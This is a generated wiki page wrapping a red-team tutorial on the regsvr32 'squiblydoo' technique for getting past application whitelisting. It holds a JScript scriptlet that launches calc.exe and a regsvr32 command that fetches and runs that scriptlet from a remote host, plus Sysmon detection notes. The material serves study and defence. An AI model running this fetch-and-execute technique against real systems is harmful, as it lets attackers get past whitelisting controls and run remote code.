---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# regsvr32

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-code-execution-t1117-regsvr32-aka-squiblydoo` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-execution/t1117-regsvr32-aka-squiblydoo.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [regsvr32](../../topics/offensive-security/regsvr32.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-code-execution-t1117-regsvr32-aka-squiblydoo |
| name | regsvr32 |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/code-execution/t1117-regsvr32-aka-squiblydoo.md |

## Preserved Source Material

````yaml
_asset_filenames:
- regsvr32-commandline (1).png
- regsvr32-network.png
- regsvr32.png
_body: "---\ndescription: regsvr32 (squiblydoo) code execution - bypass application whitelisting.\n---\n\n# regsvr32\n\n##\
  \ Execution\n\n{% code title=\"http://10.0.0.5/back.sct\" %}\n```markup\n<?XML version=\"1.0\"?>\n<scriptlet>\n<registration\n\
  \  progid=\"TESTING\"\n  classid=\"{A1112221-0000-0000-3000-000DA00DABFC}\" >\n  <script language=\"JScript\">\n    <![CDATA[\n\
  \      var foo = new ActiveXObject(\"WScript.Shell\").Run(\"calc.exe\"); \n    ]]>\n</script>\n</registration>\n</scriptlet>\n\
  ```\n{% endcode %}\n\nWe need to host the back.sct on a web server so we can invoke it like so:\n\n{% code title=\"attacker@victim\"\
  \ %}\n```csharp\nregsvr32.exe /s /i:http://10.0.0.5/back.sct scrobj.dll\n```\n{% endcode %}\n\n## Observations\n\n![calc.exe\
  \ spawned by regsvr32.exe](../../.gitbook/assets/regsvr32.png)\n\nNote how regsvr32 process exits almost immediately. This\
  \ means that just by looking at the list of processes on the victim machine, the evil process may not be immedialy evident...\
  \ Not until you realise how it was invoked though. Sysmon commandline logging may help you detect this activity:\n\n![](<../../.gitbook/assets/regsvr32-commandline\
  \ (1).png>)\n\nAdditionally, of course sysmon will show regsvr32 establishing a network connection:\n\n![](../../.gitbook/assets/regsvr32-network.png)\n\
  \n## References\n\n{% embed url=\"https://attack.mitre.org/wiki/Technique/T1117\" %}"
_relative_path: offensive-security/code-execution/t1117-regsvr32-aka-squiblydoo.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-execution/t1117-regsvr32-aka-squiblydoo.md
````
